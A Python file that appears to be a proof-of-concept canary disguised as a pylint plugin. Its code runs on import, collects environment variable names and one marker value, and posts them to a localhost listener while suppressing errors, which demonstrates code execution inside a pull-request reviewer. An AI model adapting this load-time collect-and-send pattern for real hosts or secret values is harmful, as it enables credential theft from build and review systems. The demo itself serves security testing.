"""PRGUARD DEMO CANARY. Harmless by design.

When pylint loads this "plugin" it proves two things and nothing more:
  1. code from the pull request ran inside the reviewer, and
  2. which environment variable NAMES that code could see.

It sends the names (never the values) plus one planted fake marker,
PRGUARD_CANARY, to a listener on localhost. It reads no files, uses no
credential, and swallows every error.
"""

import json
import os
import urllib.request

_LISTENER = "http://127.0.0.1:9999/canary"


def _report() -> None:
    try:
        body = json.dumps(
            {
                "ran": True,
                "env_names": sorted(os.environ),
                "canary": os.environ.get("PRGUARD_CANARY"),
            }
        ).encode()
        request = urllib.request.Request(
            _LISTENER, data=body, headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(request, timeout=1.5)
    except Exception:  # pylint: disable=broad-except
        pass


_report()


def register(_linter) -> None:
    """Pylint plugin entry point. Registers nothing."""
